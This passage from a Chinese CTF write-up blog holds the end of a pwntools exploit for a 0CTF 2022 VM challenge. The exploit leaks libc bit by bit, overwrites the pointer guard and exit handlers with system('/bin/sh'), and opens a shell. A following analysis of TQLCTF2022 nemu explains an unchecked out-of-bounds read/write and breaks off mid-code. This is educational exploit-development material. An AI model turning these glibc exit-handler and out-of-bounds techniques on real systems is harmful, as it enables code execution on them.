</span></span><span class="line"><span class="cl"><span class="n">ir64</span>    <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> \
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x23BF #call execute
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x2353 #malloc
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x228E #out malloc
</span></span></span><span class="line"><span class="cl"><span class="s2">    bbase 0x14e2 #free
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x1a0d #shr
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x1582 #switch
</span></span></span><span class="line"><span class="cl"><span class="s2">    # bbase 0x246F #exit
</span></span></span><span class="line"><span class="cl"><span class="s2">    c
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;host.docker.internal&#34;</span><span class="p">,</span><span class="mi">9999</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">gdbscript</span> <span class="o">=</span> <span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p, gdbscript=gdbscript)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">push</span>    <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span>              <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="c1">#压入寄存器的内容到栈</span>
</span></span><span class="line"><span class="cl"><span class="n">and_f</span>   <span class="o">=</span>   <span class="k">lambda</span>                  <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">nz</span>      <span class="o">=</span>   <span class="k">lambda</span> <span class="n">add_ip</span>           <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">add_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">jnz</span>     <span class="o">=</span>   <span class="k">lambda</span> <span class="n">add_ip</span>           <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">add_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">mov</span>     <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span><span class="p">,</span><span class="n">imm</span>          <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x14</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span> <span class="c1">#imm-&gt;寄存器</span>
</span></span><span class="line"><span class="cl"><span class="n">store</span>   <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span><span class="p">,</span><span class="n">memory</span>       <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x15</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span> <span class="c1">#寄存器-&gt;memory </span>
</span></span><span class="line"><span class="cl"><span class="n">load</span>    <span class="o">=</span>   <span class="k">lambda</span> <span class="n">bss</span><span class="p">,</span><span class="n">memory</span>       <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x16</span><span class="p">)</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span> <span class="c1">#mrmory-&gt;寄存器             </span>
</span></span><span class="line"><span class="cl"><span class="n">exit_f</span>  <span class="o">=</span>   <span class="k">lambda</span>                  <span class="p">:</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#让memory为main_arena地址</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0ctf2022!!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span> <span class="o">=</span> <span class="n">exit_f</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;code size:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">opcode</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;memory count:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x410</span><span class="o">&gt;&gt;</span><span class="mi">3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;input your code:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">opcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># sla(b&#39;continue?\n&#39;,b&#39;c&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#爆破获取libc</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x700000000000</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leaking bit &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">mov</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span><span class="p">)</span>        <span class="c1">#bitmask存入r0</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode</span><span class="o">+=</span> <span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c1">#bitmask 压栈</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode</span><span class="o">+=</span> <span class="n">load</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>          <span class="c1">#main_arena地址存入r1</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode</span><span class="o">+=</span> <span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>            <span class="c1">#r1压栈</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode</span><span class="o">+=</span> <span class="n">and_f</span><span class="p">()</span>            <span class="c1">#bit_mask 和 main_arena 与运算</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode</span><span class="o">+=</span> <span class="n">jnz</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>             <span class="c1">#该bit为0就exit</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode</span><span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x18</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">exit_f</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;code size:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">opcode</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;memory count:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x410</span><span class="o">&gt;&gt;</span><span class="mi">3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;input your code:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">opcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">buffer</span> <span class="o">=</span> <span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;finish!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;what&#39;</span> <span class="ow">in</span> <span class="n">buffer</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">libc_base</span> <span class="o">|=</span> <span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">-=</span> <span class="mh">0x219ce0</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rol</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">value</span> <span class="o">&lt;&lt;</span> <span class="mh">0x11</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="mh">0x11</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span>
</span></span><span class="line"><span class="cl"><span class="n">dest</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#$fs_base + 0x30（randnumber） 置0 </span>
</span></span><span class="line"><span class="cl"><span class="c1">#0x181760 fs_base+0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span> <span class="o">=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x302ec</span><span class="p">)</span> <span class="c1"># clear rand val</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">mov</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x2a00</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0x1816d8 $fs_base - 88</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x302db</span><span class="p">)</span> <span class="c1"># rbp val</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">mov</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">dest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0x1815f0  $fs_base - 0x140</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x302be</span><span class="p">)</span> <span class="c1"># rbp val </span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">mov</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0x1815f8  $fs_base - 0x138</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">store</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x302bf</span><span class="p">)</span> <span class="c1"># rbp val</span>
</span></span><span class="line"><span class="cl"><span class="n">opcode</span><span class="o">+=</span> <span class="n">exit_f</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;code size:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">opcode</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;memory count:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x2000000000030000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;continue?&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;bye bye</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># p/x $fs_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># opcode_ptr memory_ptr stack_ptr opcodesize mesize</span>
</span></span><span class="line"><span class="cl"><span class="c1"># sbase 0x5040</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#stack sp</span>
</span></span><span class="line"><span class="cl"><span class="c1">#sbase 0x5090</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># dq 0x181760 + memory_ptr</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="tqlctf2022_nemu" class="headerLink">
    <a href="#tqlctf2022_nemu" class="header-mark"></a>TQLCTF2022_nemu</h2><blockquote>
<p>别的师傅评价：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典)</p>
</blockquote>
<p>这题主要考点：<code>理解⼀个模拟器及调试器的整体架构</code>，给了源码</p>
<p>交互：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">help:查看所有指令description
</span></span><span class="line"><span class="cl">si:单步执行1次
</span></span><span class="line"><span class="cl">si 2:单步执行2次
</span></span><span class="line"><span class="cl">c:一直执行
</span></span><span class="line"><span class="cl">info r:查看寄存器
</span></span><span class="line"><span class="cl">info w:查看断点
</span></span><span class="line"><span class="cl">x 0x100005 :查看内容
</span></span><span class="line"><span class="cl">x 4 0x100000：查看4个dword内容
</span></span><span class="line"><span class="cl">w *0x100000：设置watch point
</span></span><span class="line"><span class="cl">d 1:删除第一个watch point
</span></span><span class="line"><span class="cl">set &lt;地址&gt; &lt;数据&gt;：修改数据
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里比较重要的就是<code>guest_to_host</code>这个宏</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="nf">vaddr_read</span><span class="p">(</span><span class="kt">vaddr_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">paddr_read</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="nf">paddr_read</span><span class="p">(</span><span class="kt">paddr_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">pmem_rw</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mi">0u</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="mi">4</span> <span class="o">-</span> <span class="n">len</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define pmem_rw(addr, type) *(type *)({\
</span></span></span><span class="line"><span class="cl"><span class="cp">    guest_to_host(addr); \
</span></span></span><span class="line"><span class="cl"><span class="cp">    })
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* convert the guest physical address in the guest program to host virtual address in NEMU */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define guest_to_host(p) ((void *)(pmem + (unsigned)p))
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这个宏的<code>p</code>是真实的物理地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; disass vaddr_read
</span></span><span class="line"><span class="cl">Dump of assembler code for function vaddr_read:
</span></span><span class="line"><span class="cl">   0x0000000000406ee0 &lt;+0&gt;:     mov    ecx,0x4
</span></span><span class="line"><span class="cl">   0x0000000000406ee5 &lt;+5&gt;:     mov    edi,edi
</span></span><span class="line"><span class="cl">   0x0000000000406ee7 &lt;+7&gt;:     mov    eax,0xffffffff
</span></span><span class="line"><span class="cl">   0x0000000000406eec &lt;+12&gt;:    sub    ecx,esi
</span></span><span class="line"><span class="cl">   0x0000000000406eee &lt;+14&gt;:    shl    ecx,0x3
</span></span><span class="line"><span class="cl">   0x0000000000406ef1 &lt;+17&gt;:    shr    eax,cl
</span></span><span class="line"><span class="cl">   0x0000000000406ef3 &lt;+19&gt;:    and    eax,DWORD PTR [rdi+0x6a3b80]
</span></span><span class="line"><span class="cl">   0x0000000000406ef9 &lt;+25&gt;:    ret
</span></span><span class="line"><span class="cl">End of assembler dump.
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看汇编可以看到<code>0x6a3b80</code>就是<code>p</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; dq 0x6a3b80+0x100000
</span></span><span class="line"><span class="cl">0x7a3b80 &lt;pmem+1048576&gt;:        0x0027b900001234b8      0x0441c76601890010
</span></span><span class="line"><span class="cl">0x7a3b90 &lt;pmem+1048592&gt;:        0x6600000002bb0001      0x01ffffe0009984c7
</span></span><span class="line"><span class="cl">0x7a3ba0 &lt;pmem+1048608&gt;:        0x00d600000000b800      0x0000000000000000
</span></span><span class="line"><span class="cl">0x7a3bb0 &lt;pmem+1048624&gt;:        0x0000000000000000      0x0000000000000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">100000:   b8 34 12 00 00                        movl $0x1234,%eax
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里也对应上了</p>
<p>而这里也没有对于边界的检查，所以可以进行越界读，set可以进行越界写</p>
<p>这里需要通过watchpoint去泄露</p>
<p>watchpoint数据结构</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">watchpoint</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">NO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">watchpoint</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/* TODO: Add more members if necessary */</span>
</span></span><span class="line"><span class="cl"> <span class="kt">char</span> <span class="n">exp</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> <span class="kt">uint32_t</span> <span class="n">old_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="kt">uint32_t</span> <span class="n">new_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">WP</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>考虑结构体内存对齐，实际上的内存结构：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">watchpoint</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">NO</span><span class="p">;</span>                     <span class="c1">// Offset: 0x0, Size: 0x4 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">watchpoint</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>    <span class="c1">// Offset: 0x4, Size: 0x8 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* TODO: Add more members if necessary */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">exp</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>               <span class="c1">// Offset: 0x10, Size: 0x1e bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">old_val</span><span class="p">;</span>           <span class="c1">// Offset: 0x30, Size: 4 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">new_val</span><span class="p">;</span>           <span class="c1">// Offset: 0x34, Size: 4 bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">WP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//总共0x38
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>list_watchpoint:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">list_watchpoint</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="n">WP</span> <span class="o">*</span><span class="n">head2</span> <span class="o">=</span> <span class="n">head</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">head</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;No watch pint to delete</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;NO Expr               Old Value               New Value</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">head2</span><span class="p">){</span>
